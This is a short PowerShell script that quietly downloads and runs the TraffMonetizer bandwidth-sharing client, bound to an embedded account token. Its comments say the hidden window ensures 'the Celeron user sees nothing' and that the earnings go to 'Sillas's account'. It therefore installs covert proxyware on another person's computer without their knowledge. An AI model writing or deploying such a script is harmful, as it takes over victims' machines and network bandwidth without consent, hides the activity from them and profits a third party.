# --- SILLAS: THE TRAFFMONETIZER SILENT ENGINE ---

# 1. Setup variables
$Token = "WfJ6QOVoesUIv6wbAMMtFC4BroP2ET6AK/1sDhcjC6A=" # SILLAS: Copy this from your 'Settings' tab
$WorkDir = "Z:\SystemData"
if (!(Test-Path $WorkDir)) { New-Item -ItemType Directory -Path $WorkDir }

# 2. Download the Silent CLI version
# Sillas uses a direct link to the TraffMonetizer console-only app
$AppPath = "$WorkDir\tm_worker.exe"
if (!(Test-Path $AppPath)) {
    Invoke-WebRequest -Uri "https://traffmonetizer.com/download/cli/windows/x64" -OutFile $AppPath
}

# 3. Launch the worker with the token
# -accept-offers: Automatically starts earning
# -token: Links the money to Sillas's account
# WindowStyle Hidden: Ensures the Celeron user sees nothing
Start-Process -FilePath $AppPath -ArgumentList "start", "--token", "$Token" -WindowStyle Hidden
